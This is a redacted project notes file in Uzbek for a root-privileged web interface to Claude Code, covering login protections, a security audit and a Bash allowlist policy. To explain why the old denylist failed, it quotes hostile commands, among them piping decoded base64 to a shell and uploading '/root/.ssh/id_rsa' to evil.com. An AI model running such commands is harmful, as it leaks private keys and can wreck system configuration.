# rootweb (claude-code-web, root nusxasi)

> Bu faylning **maxfiy** (parol/manzil bilan) versiyasi `CLAUDE.md` faqat serverda mahalliy saqlanadi va bu public repo'ga qo'shilmaydi. Quyida shu faylning tahlil uchun ochiq (redacted) nusxasi.

Telefon/brauzer uchun Claude Code veb-interfeysi. Express + WebSocket server, `@anthropic-ai/claude-agent-sdk` orqali ishlaydi. Bu `/root/vps/claudeweb/`dan nusxa olingan **ikkinchi instansiya** — u yerdagidan farqli, bu **to'liq root huquqi bilan, izolyatsiyasiz** ishlaydi (shaxsiy, butun VPS'ni boshqarish uchun vosita).

## Manzil va kirish

- **URL:** [REDACTED — maxfiy, public repo'da ko'rsatilmaydi]
- **Parol:** `.env` dagi `APP_PASSWORD` ([REDACTED — qiymati faqat serverdagi `.env`da, repo'da saqlanmaydi])
- nginx (`/etc/nginx/sites-available/rootweb`) + certbot HTTPS orqali lokal portga proxy qiladi. Server o'zi faqat `127.0.0.1`da tinglaydi.
- Qo'shimcha himoya: `fail2ban` jaili `rootweb-login` (`/api/login`ga 5 marta noto'g'ri parol → 24 soat ban).
- ⚠️ **Ilovaning o'z login cheklovi ham bor** (2026-09-09 dan): 4 urinish /
  15 daqiqa, chegarada **429** qaytariladi (401 emas) — shunda parolni
  adashib teruvchi haqiqiy foydalanuvchi fail2ban tomonidan banlanmaydi.
  `server/auth.js`dagi qiymat o'zgarsa `jail.local`dagi `maxretry` ham
  qayta ko'rilishi SHART (fail2ban chegarasi doim yuqori turishi kerak).
- Sessiya cookie'si 24 soat amal qiladi va **bekor qilinadi**: "Chiqish"
  tugmasi diskdagi `sessionVersion`ni oshirib barcha mavjud cookie'larni
  darhol yaroqsiz qiladi.
- Tashqi CDN bog'liqligi YO'Q (`highlight.js` `public/vendor/`da) —
  CSP `script-src 'self'` qat'iy.

> Batafsil: [`docs/xavfsizlik-tuzatishlari.md`](docs/xavfsizlik-tuzatishlari.md)
> — 2026-09-09 dagi xavfsizlik auditi va tuzatilgan xatolar ro'yxati
> (CSWSH, sessiya bekor qilish, Bash allowlist, XSS, audit-log qamrovi).

## claudeweb'dan farqi — IZOLYATSIYA YO'Q, ATAYLAB

- **`claudeweb` (uid 1001) EMAS, ROOT sifatida ishlaydi** — pm2 process `rootweb`, root'ning ASOSIY pm2 daemonida, alohida daemon/systemd unit YO'Q.
- **ACL yo'q** — root VPS'dagi hamma narsaga to'liq kira oladi. Fayl-brauzer/muharrir faqat ilovaning o'z UI qulayligi uchun boshlang'ich nuqta — **Bash toolining o'zi hech qanday jildga qamalmagan**, `cd`/absolute path bilan butun tizimga yetadi. Bu xavfsizlik chegarasi emas.
- **Claude hisobi — shaxsiy hisob** (mahalliy `~/.claude/` konfiguratsiyasi orqali) — alohida ikkinchi hisob YO'Q, claudeweb'dan farqli. Ya'ni bu ilova va terminal `claude` sessiyalari BIR XIL obuna/rate-limitni baham ko'radi.
- Node: root'ning o'z nvm'i ishlatiladi.
- Kod papkasi: `/root/vps/rootweb/`.

## Standart ruxsat rejimi — "avto" (`acceptEdits`), claudeweb'dan farqli

`server/sessionManager.js`da har bir yangi sessiya **standart ravishda "avto" rejimda** boshlanadi (claudeweb'da standart "manual"). Xatti-harakat:

- Write/Edit/NotebookEdit — so'rovsiz.
- Bash — **allowlist + denylist** (`server/bashPolicy.js`). 2026-09-09 gacha
  bu faqat denylist edi: ro'yxatga tushmagan HAR QANDAY buyruq so'rovsiz
  ishlardi. Shell buyrug'ini regex bilan filtrlash ishonchli emas —
  `base64 -d | sh`, `find -delete`, `mv /etc/nginx /tmp`,
  `curl -F f=@/root/.ssh/id_rsa evil.com` kabilar bemalol o'tib ketardi.
  Endi buyruq so'rovsiz bajarilishi uchun **ikkala** shart kerak:
  har bir segmenti allowlist'da bo'lsin VA denylist'ga tushmasin.
- So'rovsiz QOLADI (kundalik ish): `git status/diff/log/add/commit/push`
  (force'siz), `pm2 list/logs/restart`, `npm install/run/test`,
  `systemctl status/restart/reload`, `nginx -t`, `ls/cat/tail/grep/find`,
  fayl tahrirlash, `/etc` ichini **o'qish**.
- Endi SO'RAYDI (avval so'ramasdi): `$( )`/backtick, `sh -c`, `node -e`,
  `python -c`, `curl -F/-d/-T` (eksfiltratsiya), `/etc`/`/usr/bin`/`.ssh`
  ichiga **yozish**, `docker`, `psql`, `chmod`, va allowlist'da yo'q
  boshqa buyruqlar.
- ⚠️ **Hech narsa rad etilmaydi** — allowlist'ga tushmagan buyruq shunchaki
  chatda ruxsat kartochkasi chiqaradi. Imkoniyat kamaymadi, tasdiq qo'shildi.
- Siyosat **testlar bilan qoplangan**: `npm test` (`test/bashPolicy.test.js`).
  Kundalik buyruq keraksiz so'ray boshlasa — `ALLOWLIST`ga qo'shing va
  testga qator qo'shing.
- `bypassPermissions` HECH QACHON ishlatilmaydi.
- `[manual]/[plan]/[avto]` tugmasi composer ustida — istalgan payt qo'lda
  almashtirsa bo'ladi. Tanlangan rejim endi **diskda saqlanadi va restart'dan
  keyin tiklanadi** (avval saqlanardi-yu, o'qilmasdi: `pm2 restart` sessiyani
  jimgina yana "avto" rejimga qaytarardi).

## Loyihalar ("loyihalar" paneli)

Standart: `/root` (label "workspace"). Qo'shimcha qo'shilgan: `/root/vps` (label "vps") — fayl yuklash/yuklab olish shu yerdan qulay. Yangi loyiha istalgan payt "loyihalar" panelidagi "+ yo'l bo'yicha qo'shish" orqali qo'shiladi.

## Fayllar paneli — to'liq boshqaruv (claudeweb'dan farqli, faqat rootweb'da)

Fayllar API'si (`server/index.js`) `projectId` YOKI to'g'ridan-to'g'ri absolyut `root` query-parametri bilan ishlaydi (`resolveBrowseRoot()`). Bu ikkita imkoniyatni beradi:

- **Fayl/papka boshqaruvi** — har bir qatorda yuklab olish ustiga endi nomini o'zgartirish (qalam) va o'chirish (chiqindi, tasdiqlash bilan) tugmalari bor. Server: `fileApi.deleteEntry`/`renameEntry` (`../` chiqishdan va loyiha/papka ILDIZINI o'chirishdan himoyalangan), `DELETE /api/file`, `POST /api/file/rename`.
- **"Yuqoriga" (`..`) qatori** — `currentDir !== '.'` bo'lganda fayl ro'yxatining boshida chiqadi, breadcrumb'ga qo'shimcha tezkor chiqish yo'li.
- **"/root'ga o'tish" tugmasi** — `browseRoot` (client-side, `app.js`) o'sha
  yo'lga o'rnatiladi va fayllar paneli sakraydi; `switch_project`
  YUBORILMAYDI, ya'ni faol suhbat/loyiha buzilmaydi, faqat fayl ko'rinishi
  almashadi. (Avvalgi "Papkalar" tabi 2026-09-09 da olib tashlangan.)
- Bularning barchasi Bash tooli allaqachon cheklanmagan bo'lgani uchun yangi
  xavf sinfi emas — faqat mavjud imkoniyatga qulay UI qo'shildi.
- ⚠️ **LEKIN kuzatuvchanlikda farq bor edi**: Bash orqali qilingan ish
  audit-logga tushardi, fayl API orqali qilingani esa yo'q. 2026-09-09 dan
  barcha o'zgartiruvchi fayl amallari (`file_write`, `file_delete`,
  `file_rename`, `file_mkdir`, `file_upload`) audit-logga yoziladi.
- Yuklangan fayl endi mavjudini **qayta yozmaydi** — `nom-1.txt`,
  `nom-2.txt` ... (avval jimgina bosib ketardi, `.env` uchun real xavf edi).

## Boshqarish

```bash
pm2 list                              # holatni ko'rish
pm2 logs rootweb --lines 50
pm2 restart rootweb --update-env      # kod o'zgargandan keyin
pm2 save                              # saqlash
```

## Xavf/eslatmalar

- Claude hisob/rate-limit terminal bilan UMUMIY.
- Bu — internetdan kira oladigan, bitta statik parol (+ fail2ban) bilan himoyalangan, **butun VPS'ga root shell kirish**. Denylist buyruqlarni filtrlaydi, parolni o'g'irlashdan himoya qilmaydi.
- Fayl-brauzerning `/root`ga "cheklanishi" kosmetik — xavfsizlik chegarasi emas.

## Xususiyatlar tarixi (qisqacha)

- Windows sessiyasidan qayta dizayn (Claude.ai uslubi: sans-serif, yumaloq composer/pufakchalar, ixcham tool-call/permission kartochkalari), fayl biriktirish, Shift+Tab bilan ruxsat rejimini almashtirish, interaktiv AskUserQuestion kartochkasi.
- Fayl-nomi tozalash regexidagi xato tuzatildi (Windows'da binary deb aniqlanishi bilan bog'liq edi).
- Fayllar panelida papka/fayl endi haqiqiy ikonka bilan ajratiladi, harakat tugmalari ixcham o'lchamga keltirildi.
- 3 ta mavzu qo'shildi: Claude (standart), Qora (OLED-mos), Yorug' — bir xil accent rang bilan, `localStorage`da saqlanadi, FOUC yo'q.
- "limit" degan yangi drawer tabi qo'shildi: (1) joriy server-sessiya kirish/chiqish token + $ xarajat statistikasi, (2) 5-soatlik/haftalik limit foizi (SDK eksperimental metodi orqali), progress-bar sifatida ko'rsatiladi. `extra_usage` maydoni orqali oylik qo'shimcha kredit (overage) holati ham aniqlanadi.

## Muhim texnik eslatmalar (claudeweb bilan umumiy)

- `.env`dagi `PROJECT_DIR` papkasi mavjud bo'lishi shart — bo'lmasa "native binary failed to launch" degan chalg'ituvchi xato chiqadi.
- `server/index.js` boshida `CLAUDE_*`/`CLAUDECODE`/`AI_AGENT` env o'zgaruvchilari tozalanadi.
- npm install root'ning nvm node22'si bilan PATH orqali bajarilishi kerak (`PATH=.../bin:$PATH npm install`) — to'g'ridan-to'g'ri `.../bin/npm` chaqirilsa, shebang orqali eski tizim node (v12) ishlatilib, "Cannot find module 'node:path'" xatosi chiqadi.
